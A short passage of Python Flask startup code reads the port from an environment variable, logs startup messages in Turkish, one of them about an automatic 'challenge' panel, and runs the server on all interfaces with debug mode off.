    port = int(os.getenv("PORT", 10000))
    logger.info(f"🚀 Sunucu başlatılıyor: 0.0.0.0:{port}")
    logger.info(f"🔐 Challenge otomatik panel aktif")
    
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
